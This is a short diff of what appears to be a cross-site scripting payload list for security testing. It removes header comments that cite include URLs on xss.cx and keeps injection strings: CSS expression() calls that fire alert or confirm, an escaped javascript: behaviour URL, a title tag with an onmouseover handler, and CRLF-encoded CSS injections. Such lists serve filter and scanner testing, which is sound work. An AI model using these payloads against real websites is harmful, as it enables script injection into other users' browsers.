@@ -1,9 +1,3 @@
-/* Remote File Include with TAGS via XSS.Cx  */
-/* INCLUDE:URL http://xss.cx/examples/ultra-low-hanging-fruit/no-experience-required-http-header-injection-signatures-only-fools-dont-use.txt */
-/* INCLUDE:URL http://xss.cx/examples/ultra-low-hanging-fruit/no-experience-required-javascript-injection-signatures-only-fools-dont-use.txt */
-/* INCLUDE:URL http://xss.cx/examples/ultra-low-hanging-fruit/no-experience-required-xss-injection-signatures-only-fools-dont-use.txt */
-/* Updated September 28, 2014 */
-/* RFI START */
 width:expression(if(!window.done)alert(1),window.done=1)
 expression(window.x?0:(confirm(7),window.x=1))
 background-image:url(https://s1.yimg.com/rz/l/yahoo_en-US_b_w_26x14_2x.png)
@@ -22,4 +16,3 @@ behaviour:url\0028javascript:confirm\0028[0][0]\0029\0029
 <title onmouseover="alert(1)">hover me</title>
 %0A{}*{color:red;}
 %0A%0D{}*{color:red;}
-/* RFI END */
